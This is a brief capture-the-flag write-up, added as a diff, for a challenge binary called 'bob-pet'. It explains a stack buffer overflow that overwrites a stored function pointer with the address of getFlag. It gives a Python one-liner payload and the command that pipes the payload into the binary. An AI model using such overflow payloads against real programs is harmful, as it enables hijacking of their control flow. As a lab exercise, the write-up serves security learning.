@@ -1,0 +1,4 @@
+1. in main it scans the input at ($ebp-0x61). then loads address of function "lose" in eax from ($ebp-0xc) and calls eax. (0x61 = 97 in decimal)
+2. We can write address of function getFlag (0x0804856b) at $ebp-0xc which will print the flag. Execute following 2 commands to find flag.
+3. python -c 'print "A"*85 + "\x6b\x85\x04\x08"' > test
+4. ./bob-pet < test
